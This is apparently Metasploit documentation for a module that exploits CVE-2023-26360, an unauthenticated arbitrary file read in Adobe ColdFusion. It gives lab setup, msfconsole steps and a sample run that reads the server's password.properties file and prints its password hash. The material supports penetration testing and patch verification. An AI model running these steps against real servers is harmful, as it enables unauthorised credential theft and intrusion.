## Vulnerable Application
This module leverages an unauthenticated arbitrary file read vulnerability due to deserialization of untrusted data
in Adobe ColdFusion. The vulnerability affects ColdFusion 2021 Update 5 and earlier as well as ColdFusion 2018 Update
15 and earlier. For a full technical analysis of the vulnerability read the
[Rapid7 AttackerKB Analysis](https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360/rapid7-analysis).

## Options
To successfully read back the contents of an arbitrary file, you must set the modules `CFC_ENDPOINT` option to a valid
ColdFusion Component (CFC) endpoint on the target server. You must also set the `CFC_ENDPOINT` option to the name of a
remote method from that `CFC_ENDPOINT`. While the vulnerability is triggered regardless of remote method begin invoked,
in order for ColdFusion to emit the `TARGETFILE` contents in the HTTP response, the remote method invoked must return
a result. If the CFC_METHOD requires parameters, they can be provided via the `CFC_METHOD_PARAMETERS` option. By default
a CFC endpoint and method from the ColdFusion Administrator (CFIDE) are provided, which is accessible in many but not
all configurations.

## Testing
To setup a test environment, the following steps can be performed.
1. Setup a Windows Server 2022 VM.
2. Download the [ColdFusion 2021
Update 5](https://cfdownload.adobe.com/pub/adobe/coldfusion/2021/cfinstaller/cf2021u5/ColdFusion_2021_GUI_WWEJ_win64.exe)
installer and install it.
3. Configure the ColdFusion server for production use and enable the Secure Profile during setup.
4. If the default CFIDE endpoints are not accessible (e.g. The server is configured with a Secure profile), install a 
web application on top of ColdFusion in order to expose CFC endpoints. Alternatively, create a test CFC endpoint
called `testing.cfc` in the `wwwroot` folder with the following contents:
```
component testing {
	
	remote String function foo()  { 

		return "Hello from foo";
	}
}
```
5. Follow the verification steps below.

## Verification Steps
1. Start msfconsole
2. `use auxiliary/gather/adobe_coldfusion_fileread_cve_2023_26360`
3. `set RHOSTS <TARGET_IP_ADDRESS>`
4. `set CFC_ENDPOINT /testing.cfc`
5. `set CFC_METHOD foo`
6. Optionally `set CFC_METHOD_PARAMETERS param1=foo, param2=bar` if the CFC_METHOD requires parameters.
7. `set TARGETFILE ../lib/password.properties`
8. `set STORE_LOOT false` if you want to display file on the console instead of storing it as loot.
9. `run`

## Scenarios
### Adobe ColdFusion 2021 Update 5 on Windows Server 2022
```
msf6 auxiliary(gather/adobe_coldfusion_fileread_cve_2023_26360) > show options

Module options (auxiliary/gather/adobe_coldfusion_fileread_cve_2023_26360):

   Name                   Current Setting             Required  Description
   ----                   ---------------             --------  -----------
   CFC_ENDPOINT           /testing.cfc                yes       The target ColdFusion Component (CFC) endpoint
   CFC_METHOD             foo                         yes       The target ColdFusion Component (CFC) remote method name
   CFC_METHOD_PARAMETERS                              no        The target ColdFusion Component (CFC) remote method parameters
                                                                 (e.g. "param1=foo, param2=bar")
   Proxies                                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                 172.23.13.12                yes       The target host(s), see https://docs.metasploit.com/docs/using
                                                                -metasploit/basics/using-metasploit.html
   RPORT                  8500                        yes       The target port (TCP)
   SSL                    false                       no        Negotiate SSL/TLS for outgoing connections
   STORE_LOOT             false                       no        Store the target file as loot
   TARGETFILE             ../lib/password.properties  yes       The target file to read, relative to the wwwroot folder.
   VHOST                                              no        HTTP server virtual host

msf6 auxiliary(gather/adobe_coldfusion_fileread_cve_2023_26360) > run
[*] Running module against 172.23.13.12

[*] #Tue Mar 28 01:33:23 PDT 2023
password=30160D97731079B7ACCF7BCFAD049FCCCA3F855318037AC09DC00FFD52A29F5C
rdspassword=
encrypted=true

[*] Auxiliary module execution completed
msf6 auxiliary(gather/adobe_coldfusion_fileread_cve_2023_26360) > 
```
